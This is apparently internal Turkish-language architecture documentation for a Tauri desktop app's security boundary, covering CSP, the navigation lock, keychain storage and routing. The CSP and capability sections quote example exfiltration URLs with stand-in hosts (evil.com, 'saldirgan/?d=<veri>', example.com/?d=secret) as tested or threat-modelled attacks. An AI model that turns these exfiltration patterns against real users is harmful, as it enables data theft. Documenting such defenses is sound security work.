# Keystone masaüstü mimarisi (D3)

Bu not D3 sonundaki Tauri kabuğunu anlatır: webview'ın ne yapabildiği, isteklerin nerede cevaplandığı, sırların nerede durduğu ve bilinen sınırlar. Planın kendisi `desktop/PLAN.md`, sunucu sözleşmesi `docs/SYNC-PROTOCOL.md` ve `contracts/` altındadır.

## Katmanlar

| Katman | Yer | Görev |
|---|---|---|
| Webview | `desktop/src` | Arayüz. D3'te yalnız smoke sayfası; React uygulaması D4'te gelir. Veriyi komutlarla alır: istekler CSP ile, gezinme ve yeni pencere navigasyon kilidiyle kapalı; tek istisna `shell:allow-open` (bkz. [Capability](#capability)). |
| Köprü | `desktop/src/bridge` | Tipli `invoke`/`listen` sarmalayıcıları. `generated/` Rust DTO'larından üretilir. |
| Kabuk | `desktop/src-tauri` | Komutlar, yönlendirme, profiller, realtime köprüsü, loglama. |
| `keystone-sync` | `desktop/crates/keystone-sync` | HTTP istemcisi, SQLCipher yerel kopya, outbox, conflict, sync döngüsü. |
| `keystone-secrets` | `desktop/crates/keystone-secrets` | OS keychain üzerinde token, DB anahtarı ve kurulum sırları. |
| `keystone-realtime` | `desktop/crates/keystone-realtime` | Reverb (Pusher protokol 7) istemcisi. HTTP ve token erişimi yoktur. |

Tipler sınırı geçerken kabuk DTO'larına çevrilir; crate tipleri webview'a doğrudan verilmez (`src-tauri/src/dto`). `sh desktop/scripts/check-ts-types.sh` üretilen TS tiplerini Rust ile karşılaştırır, CI'da `desktop-shell` işinde koşar.

## Komut yüzeyi

Her komut `Result<T, CommandError>` döner; hata `{code, message, retry_after?}` biçimindedir. UI `code` ile anahtarlar (`desktop.errors.<code>`), `message` yalnız tanı içindir. Komut listesinin tek kaynağı `src-tauri/src/lib.rs` içindeki `generate_handler!` çağrısıdır.

| Grup | Komutlar | Not |
|---|---|---|
| Tanı | `app_info` | Sürüm, kimlik, şema sürümü, işletim sistemi, debug. Sır yok. |
| API | `api_request` | Webview'ın tek veri kapısı. Bkz. [Yönlendirme](#yönlendirme). |
| Profil | `profile_add`, `profile_list`, `profile_select`, `profile_reset`, `profile_remove`, `profile_select_company` | `profile_add` sunucunun `meta` yanıtını okur; `desktop.min_version` ve şema sürümü uymazsa reddeder. |
| Kimlik | `auth_login`, `auth_restore`, `auth_sign_out`, `auth_devices_list`, `auth_devices_revoke` | Parola webview'dan Rust'a bir kez geçer, tutulmaz. Token webview'a hiç dönmez. |
| Sync | `sync_now`, `sync_status`, `outbox_list`, `outbox_retry`, `outbox_discard`, `conflicts_list`, `conflicts_resolve` | Bekleyen iş yönetimi ve Conflict Inbox. |
| Realtime | `realtime_status` | Başlangıç durum olayı webview dinlemeye başlamadan gidebileceği için anlık durum sorgusu. |

### Olaylar

Webview'a iki sıralı olay akar, ikisinde de her yük `profile_id` taşır; UI terk ettiği profilin haberini atar.

| Olay | Yük | Kaynak |
|---|---|---|
| `engine-event` | `{type: status, ...}`, `{type: resources_changed, ...}` | `src-tauri/src/events.rs` |
| `realtime-event` | `state`, `session_revoked`, `membership_revoked`, `notification_created` | `src-tauri/src/realtime.rs` |

Reverb soketi Rust tarafında açılır, webview CSP'sine girmez. Olay etkileri:

- `.session.revoked`: `forget_tokens(g)` nesil karşılaştırmalı çalışır, sonra `trigger(Manual)` ve UI olayı. Yerel veri silinmez; sonraki koşu `AuthRequired` olur ve yerel okumayı mühürler. Eski nesilden gelen olay yok sayılır.
- `.membership.revoked`: `trigger(Manual)` ve UI olayı.
- `.notification.created`: yalnız UI olayı.

## Yönlendirme

`api_request` isteği doğrular, `Idempotency-Key` tekrarını yönlendirmeden önce cevaplar, sonra yol tablosuna bakar. Tablo `contracts/offline-manifest.json` dosyasından çalışma anında okunur (`router/decide.rs`). `{param}` yalnız UUID ile eşleşir.

### Okuma

| Kaynak | Çevrimiçi | Çevrimdışı |
|---|---|---|
| Tabloda yok | Sunucu | `OFFLINE_UNAVAILABLE` (503) |
| Yerel kopya hiç inmemiş | Sunucu | `OFFLINE_UNAVAILABLE` (503) |
| `local-first`, kopya tam | Yerel | Yerel |
| `local-first`, kopya yarım | Sunucu (5 sn), düşerse yerel `stale` | Yerel, `partial` |
| `online-first` | Sunucu (5 sn), düşerse yerel `stale` | Yerel, `stale` |
| `offline-fallback` (snapshot) | Sunucu | Saklı snapshot, `as_of` etiketli |

Yerel kopya bir isteği karşılayamıyorsa (indekslenmemiş filtre, inmemiş snapshot) çevrimiçiyken istek sunucuya gider, çevrimdışıyken `meta.offline.unsupported_filters` ile reddedilir. Yerel yanıtlar Laravel zarfını birebir taşır, `meta.offline` altında `as_of`, `partial`, `stale` bulunur.

### Yazma

| Durum | Sonuç |
|---|---|
| Çevrimiçi | Sunucu |
| Çevrimdışı, yerel depo yok | `OFFLINE_UNAVAILABLE` (503) |
| Çevrimdışı, manifest uyuşmuyor | `SYNC_OFFLINE_WRITE_NOT_ALLOWED` (422) |
| Çevrimdışı, işlem `WritePolicy` dışında | `OFFLINE_UNAVAILABLE` (503) |
| Çevrimdışı, işlem izinli | Outbox taslağı; satır düzeyi kurallar kuyruğa girerken denetlenir (`DOCUMENT_LOCKED` vb.) |

Sessiz üzerine yazma yoktur: taslak `base_version` taşır, çakışma Conflict Inbox'a düşer.

`Idempotency-Key` cihazda 7 gün saklanır. Kayıtlı anahtar sunucuya gönderilmez; tekrar aynı satır kimliğini ve durum kodunu döner, gövde satırın o anki halidir. Aynı anahtar başka istekle gelirse `IDEMPOTENCY_KEY_REUSED` (422).

### Ağa açılan kapı

`HttpClient::proxy` yalnız `/api/v1/` altına gider. Webview'dan yasak yollar: `/api/v1/auth` ve altı (yalnız `GET /api/v1/auth/me` hariç), `/api/v1/sync` ve altı, `/api/v1/broadcasting/auth`. Bunları yalnız Rust tarafı kendi komutlarıyla çağırır. İstek başlıkları `idempotency-key`, `accept-language`, `if-none-match`, `content-type` ile, yanıt başlıkları `content-type`, `content-disposition`, `etag`, `retry-after`, `x-request-id` ile sınırlıdır. Gövde sınırı 32 MB'dir. Bearer token isteğe Rust'ta eklenir.

## Keychain sözleşmesi

Servis adı `com.keystone.desktop`. Sırlar yalnız OS keychain'inde durur.

| Hesap adı | İçerik |
|---|---|
| `<profil id>` | Oturum kaydı, JSON: `{tokens?, generation, deactivated}` |
| `db-key:<profil id>` | SQLCipher anahtarı, 64 hex |
| `slot:<ad>` | Kurulum sırrı (cihaz parmak izi), 64 hex |

- Profil başına tek oturum kaydı: `take`, `sign_in`, `deactivate`, `sign_out` tek yazımdır, parçalı kayıt oluşmaz. Boyut Windows Credential Manager sınırının (2560 bayt) altında tutulur.
- `generation` hiçbir yolla sıfırlanmaz. Süresi dolan kararlar nesil karşılaştırmasıyla uygulanır, eski nesilden gelen sonuç yeni oturumu bozamaz.
- Tek süreç içinde aynı servisin tüm handle'ları tek kilit ve tek önbelleği paylaşır. Yazma önce keychain'e gider; başarısızsa önbellek değişmez.
- `DbKey` bellekte `Zeroizing` ile taşınır. Keychain kaybında veri otomatik silinmez: `STORE_KEY_INVALID` döner, kullanıcı onayıyla profil verisi silinip yeniden indirilir.
- `profiles.json` (app data) sunucu adresi, `meta` anlık görüntüsü ve seçili şirketi tutar; sır içermez.

## Güvenlik sınırı: CSP ve izinler

### CSP

`tauri.conf.json` içindeki politika:

```
default-src 'self'; connect-src ipc: http://ipc.localhost; img-src 'self' data: blob:;
font-src 'self' data:; style-src 'self'; script-src 'self'; object-src 'none';
frame-ancestors 'none'; form-action 'none'; base-uri 'self'
```

- `connect-src` yalnız IPC'dir: `fetch`, `XMLHttpRequest`, `WebSocket`, `EventSource` ve `sendBeacon` dış adrese, hatta uygulamanın kendi kökenine çıkamaz. İki adres de gerekir, çünkü IPC Windows'ta `http://ipc.localhost`, diğer sistemlerde `ipc:` üzerinden gider. Biri eksik olursa IPC kırılmaz ama sessizce yavaş `postMessage` yoluna düşer.
- Tauri paketli varlıklardaki `script-src` ve `style-src` yönergelerine hash ve nonce ekler (`dangerousDisableAssetCspModification` kapalı kalır). Bu nedenle webview'ın gördüğü başlık yapılandırma metniyle aynı değildir. Windows'ta `tauri build --debug` ikilisinde ölçülen başlık (`http://tauri.localhost/`):

  ```
  base-uri 'self'; script-src 'self' 'sha256-…'; img-src 'self' data: blob:; form-action 'none';
  font-src 'self' data:; object-src 'none'; default-src 'self'; connect-src ipc: http://ipc.localhost;
  frame-ancestors 'none'; style-src 'self'
  ```

  Aynı pencerede dış `fetch`/XHR/WebSocket/EventSource/beacon `connect-src`, dış görsel `img-src`, satır içi betik ve `eval` `script-src`, satır içi stil özniteliği `style-src-attr`, enjekte edilen `<base href="https://…">` `base-uri` ihlaliyle engellendi; `app_info` ve olay dinleme çalıştı.
- `base-uri 'self'`: `default-src` bu yönergeyi kapsamaz; olmadan enjekte edilmiş bir `<base>` göreli adresleri başka köke saptırırdı.
- `style-src-attr 'unsafe-inline'` yoktur: bugünkü sayfada satır içi stil ölçülmedi. Radix ve sonner gelince D4 ölçerek ekler; `style-src 'unsafe-inline'` olarak genişletilmez.
- `keystone-asset:` D5'te eklenir.
- `devCsp` yapılandırmada Vite'ın `ws://localhost:1420` soketi dışında aynıdır, ama **`tauri dev` penceresinde uygulanmıyor** (ölçüldü): sayfa Vite'tan (`http://localhost:1420`) gelir, Tauri CSP'yi yalnız kendi protokol yanıtına ekler. Dev penceresinde CSP başlığı yoktu, enjekte `<base>` ve dış istekte ihlal raporlanmadı. CSP ihlalleri bugün yalnız `tauri build --debug` ikilisinde görülür. Düzeltme `vite.desktop.config.ts` içinde `server.headers['Content-Security-Policy']` (P0 dosyası, D4).

### Gezinme ve yeni pencere

CSP üst düzey gezinmeyi ve `window.open`'ı kapsamaz. Ana pencere bu yüzden yapılandırmadan değil kodda kurulur (`tauri.conf.json` içinde `create: false`, `lib.rs` `create_main_window`):

- `on_navigation`: yalnız uygulama kökeni (`http://tauri.localhost`, `tauri://localhost`) ve yalnız `tauri dev` derlemesinde `build.devUrl` kökeni kabul edilir. Kullanıcı bilgisi taşıyan adresler (`http://tauri.localhost@evil.com`, `http://user@tauri.localhost`), benzer ana makineler, başka port, `https://tauri.localhost`, `data:`, `file:`, `about:`, `blob:` reddedilir. Karar `app_url_allowed` saf fonksiyonunda, tablo testli. Engellenen gezinme yalnız şemasıyla loglanır.
- `on_new_window`: her istek reddedilir. `window.open` `null` döner, `target=_blank` hiçbir şey açmaz. İzin verilen bir açılır pencere Tauri'nin yönetmediği, capability dışı bir WebView2 penceresi olurdu.
- Pencerede ölçüldü: `window.open('https://example.com/?d=…')` `null` döndü ve yeni hedef açılmadı; `location` ile `https://`, kullanıcı bilgili, benzer ana makineli, `data:`, `file:` adreslerine gidilemedi; aynı köken içi gezinme çalıştı. Kilit geçici kaldırılınca aynı denemede pencere açıldı ve sayfa `https://example.com/?d=secret` adresine gitti.
- Kararlar saf fonksiyonlardadır ve testlidir: `main_window_config` (yalnız `main` etiketli ve `create: false` olan girdi), `navigation_hook` (pencereye takılan kancanın kendisi), `new_window_allowed` (her zaman `false`). Kurucu zincirinin kendisi birim testle sınanmaz: `tauri::Wry` tipini test ikilisine sokmak Windows'ta ikiliyi açılmaz yapıyor (`0xc0000139`), mock runtime ise `tauri` `test` özelliğini istiyor. Bu iki boşluk gerçek pencerede ölçüldü: `on_new_window` eşlemesi `Allow`'a çevrilince `window.open` pencere açtı ve dışarı gitti; `create_main_window` çağrısı kaldırılınca hiç pencere açılmadı (kapalı kalır).
- Gezinme kilidi bir plugin'in `on_navigation` kancası yerine pencere kurucusunda durur: plugin kancası webview kaydı tamamlanmadan gelen gezinmede çağrılmaz, pencere kancası her gezinmede çağrılır. Yeni pencere kancası zaten yalnız pencere kurucusunda vardır.

### Derleme kapısı

`src-tauri/build.rs`, `src/build_guard.rs` üzerinden etkin yapılandırmayı tauri-build ile aynı sırada birleştirir: `tauri.conf.json`, varsa `tauri.<os>.conf.json`, varsa `TAURI_CONFIG`. Release derlemesi şu durumlarda durur:

- politika yok ya da yer tutucu (`keystone-placeholder-csp`);
- `connect-src` tam olarak `ipc:` ve `http://ipc.localhost` değil (`http:`, `https:`, `ws:`, `wss:`, adres, `*`, `'self'` reddedilir, yönerge yoksa da reddedilir);
- başka herhangi bir yönergede şema ya da ana makine adlandıran kaynak (`img-src https:`, `media-src *`, `frame-src https://…`, `font-src http:` vb.); bu yönergelerde yalnız `'self'`, `'none'`, hash, nonce, `data:`, `blob:` ve anahtar sözcükler kalır;
- betik yönergelerinde (`default-src`, `script-src`, `script-src-elem`, `script-src-attr`, `worker-src`) `'unsafe-inline'`, `'unsafe-eval'`, `'unsafe-hashes'`, `'wasm-unsafe-eval'` gibi anahtar sözcükler, `data:` ya da `blob:`;
- `report-uri` ya da `report-to` (ihlal raporu cihaz dışına gider);
- `app.windows` tek bir `main` penceresi değil, `create: false` değil ya da pencere `url` alanı uygulama yolu yerine adres (`https://…`, `data:…`). Gezinme kilidi yalnız kodda kurulan ana pencerede olduğundan, overlay ile eklenen ikinci bir pencere kilitsiz açılırdı;
- `dangerousDisableAssetCspModification` açık;
- `KEYSTONE_DEV_ALLOW_HTTP` ayarlı.

Ortam ve dosya okuma `build_guard::gather` içindedir (`PROFILE`, `CARGO_CFG_TARGET_OS` ile seçilen platform dosyası, `TAURI_CONFIG`, `KEYSTONE_DEV_ALLOW_HTTP`), `build.rs` yalnız bunu çağırır; böylece bağlama da birim testle sınanır.

CI `desktop-shell` işi `cargo check --release -p keystone-desktop` ile kapıyı gerçek yapılandırmada koşar ve `connect-src https:` ekleyen bir `TAURI_CONFIG` ile derlemenin 101 ile (betik panik) reddedildiğini ve kapının mesajını doğrular. `config_tests` iş akışı dosyasını okuyup bu adımların koşulsuz olduğunu (`continue-on-error`, `if:` yok) ve 101 beklendiğini sabitler.

Debug derlemesi aynı sorunlarda yalnız uyarır; `tauri build --debug` çıktısı dağıtılmaz. `KEYSTONE_DEV_ALLOW_HTTP=1` yalnız debug derlemede etkilidir (`bootstrap::allow_http`), release ikilisi değişkeni okusa da yok sayar.

### Capability

`capabilities/default.json` tek capability'dir, yalnız `main` penceresine bağlıdır. `core:default` kullanılmaz; verilenler:

| İzin | Neden |
|---|---|
| `core:event:allow-listen`, `allow-unlisten` | `engine-event`, `realtime-event` dinleme |
| `core:event:allow-emit` | Plan D4 için ayırdı; bugün kullanılmıyor |
| `core:window:allow-show`, `allow-hide`, `allow-set-focus`, `allow-minimize`, `allow-close` | Pencere yönetimi; plan D4 için ayırdı, bugün kullanılmıyor |
| `os:allow-platform` | Etkisiz: tauri-plugin-os 2'de `platform` komut değildir, değer başlangıç betiğiyle gelir (pencerede `Command platform not found`) |
| `process:allow-restart` | Yeniden başlatma; plan D5 için ayırdı, bugün kullanılmıyor |
| `shell:allow-open` | Dış `https` bağlantısını varsayılan tarayıcıda açma; bugün TS tarafında kullanılmıyor. Ağ etkili tek izin, bkz. aşağıdaki not |

`fs`, `http`, `dialog`, `core:path`, `core:app`, `core:webview` izinleri yoktur; pencerede bu komutlar `not allowed` ile reddedildi. Uygulama komutları capability ile kapılı değildir; kendi doğrulamalarını yapar.

`shell:allow-open` için URL sınırı capability'de değil, `plugins.shell.open` deseninde durur: plugin `open` komutunda yalnız bu deseni uygular, capability kapsamına URL yazmak etkisizdir. Plugin deseni `^{desen}$` olarak derler; desen `https://\S+` olduğundan boşluk ya da satır sonu içermeyen `https://` adresleri kabul edilir, `http`, `file`, `mailto`, `tel` ve yol reddedilir. D3 öncesindeki `^https://` deseni `^^https://$` olarak derlendiği için hiçbir gerçek adresi kabul etmiyordu. Desen kaldırılırsa plugin varsayılanı `http`, `mailto`, `tel` açar; `shell_open_is_limited_by_the_config_pattern` testi deseni plugin gibi derleyip sabitler.

**Bilinen sınır:** `shell:allow-open` webview'a ağa etkili tek kapıyı bırakır. Sayfada betik çalıştırabilen bir saldırgan (XSS, ele geçirilmiş bağımlılık) `https://saldirgan/?d=<veri>` adresini kullanıcının tarayıcısında açarak veri sızdırabilir. İzin plan gereği şimdilik duruyor (şef kararı). D4'te webview'dan açılacak bağlantıları doğrulayan bir Rust komutuyla değiştirilir ve izin kaldırılır.

### Tek örnek

`tauri-plugin-single-instance` ilk plugin'dir. İkinci açılış pencereyi öne getirip çıkar. Keychain için süreçler arası kilit olmadığından bu zorunludur.

### Loglama

Log formatı `src-tauri/src/logging.rs` içinde maskelenir: token, parola, kanal imzası, e-posta, telefon. `tungstenite` hedefleri en fazla `Info` seviyesindedir, çünkü `Trace` çerçeveleri imza içerir. Release seviyesi `Info`'dur. Webview log hedefi yoktur.

## Çalışma düzeni

- Motor döngüsü ve realtime köprüsü ayrı tokio runtime iş parçacığında koşar (`runtime.rs`). Komut tarafındaki store işleri `spawn_blocking` ile yapılır. Motorun içindeki store çağrıları senkrondur; uzun SQLite işi sırasında soket ping'i gecikebilir.
- Sync 60 sn zamanlayıcı, `sync_now` ve realtime tetikleriyle koşar.
- Profil değişiminde köprü en fazla 3 sn beklenir, sonra kesilir.
- Bağlantı durumu son proxy sonucundan (30 sn) ya da motor durumundan okunur.

## Bilinen sınırlar

### Tasarım gereği

- Süreçler arası kilit yok: keychain karşılaştırmalı yazma sunmaz. Tek örnek ile kapatılır.
- `Retry-After` sınırı bellektedir: yeniden başlatınca unutulur.
- SSE yok: `streamPost` ve asistan akışı D3 dışıdır, komutlar yanıtı tek parça döner. D4/D5'te Tauri `Channel` ile gelir.
- Kaynak değişikliği yayını yok: realtime yalnız üç kullanıcı olayı taşır, tazelik 60 sn döngüsüyle sağlanır. Web'e `sync.changed` backlog'da.
- Çevrimdışı filtre ve sıralama yalnız `search`, sayfalama ve manifest `window_field` ile sınırlıdır.
- Presence kanalı yok.

### Takip listesi

| Konu | Etki | Kapatma yolu |
|---|---|---|
| `Arc::ptr_eq` denetimi ile `put_snapshot` arası pencere; `check_access` şirket karşılaştırmaz | Aynı nesilde tam o anda şirket değişirse snapshot eski şirkete yazılabilir | Şirket değişimi işinde crate kimliği sorgulatır |
| `snapshot_refresh_minutes` döngüsü yok | Snapshot yalnız UI o GET'i yaparsa tazelenir, hiç açılmamış ekran çevrimdışı 503 döner | Motor döngüsüne eklenir |
| Mühürlü veride `Idempotency-Key` kaydı okunamaz | Yeniden girişte ilk koşu bitmeden aynı anahtarla tekrar mükerrer olabilir | `Outbox::request_record` yalnız `ensure_unsealed` |
| Kesilen revoke | Profil değişimi işlenen `.session.revoked` olayını 3 sn sonra keserse token sonraki 401'e kadar kalır; sunucu oturumu zaten bitmiştir | `forget_tokens` ayrı görevde |
| Şirketsiz profilde `AuthRequired` yok | Revoke token'ı düşürür, UI olayı gider, motor durumu oluşmaz | Şirket seçilmeden döngü yok; `auth_state` tutarlı |
| `meta_snapshot` tazelenmez | Sunucu Reverb ayarı değişince profil yeniden eklenmelidir | Meta yenileme yolu |
| `keystone-realtime` `event.rs` ve `lib.rs` doc'ları bayat | Yanıltıcı yorum; davranış yukarıda anlatıldığı gibidir | Sonraki crate turu |
| Realtime test boşlukları | Soket sırası durum sırasından, log tavanı kaynak metninden sınanıyor | Mock uygulamalı test |
| `mask` kaçışlı JSON ve `Value` Debug biçimlerini yakalamaz | Bugün bu biçimde log yazan kod yok | `SECRET_FIELD` genişletilir |
| `a_sign_in_during_the_call_sends_it_once_more` | 150 ms bekleme nedeniyle yük altında kırılgan | Sabit bekleme yerine olay |
| `allow-emit`, `core:window:*`, `os:allow-platform`, `process:allow-restart` | Bugünkü sayfa kullanmıyor, plan D4/D5 için ayırdı | D4 sonunda kullanılmayan çıkarılır |
| `shell:allow-open` XSS sonrası sızıntı kanalı | Saldırgan `https://` adres açabilir | D4: doğrulayan Rust komutu, izin kaldırılır |
| `tauri dev`'de CSP uygulanmıyor | Geliştirici ihlalleri yalnız debug ikilisinde görür | `vite.desktop.config.ts` `server.headers` |
| `shell` plugin'inin `open` komutu kullanımdan kalkıyor | Davranış bugün doğru | `tauri-plugin-opener` (`opener:allow-open-url` URL kapsamını uygular) |
| Webview'da token yokluğu yalnız giriş öncesi ölçüldü | Giriş sonrası depolama ve bellek araması elle yapılacak | Kapanış turu |

## Doğrulama

- Rust: `cd desktop && cargo fmt --all -- --check && cargo clippy --workspace --all-targets --locked -- -D warnings && cargo test --workspace --locked && sh scripts/gen-wire.sh && cargo deny check && cargo audit`
- TS: `npm run -w desktop lint && npm run -w desktop typecheck && npm run -w desktop test`
- Tipler: `sh desktop/scripts/check-ts-types.sh`
- Kabuk derlemesi: `cd desktop && npm run tauri -- build --debug --no-bundle`
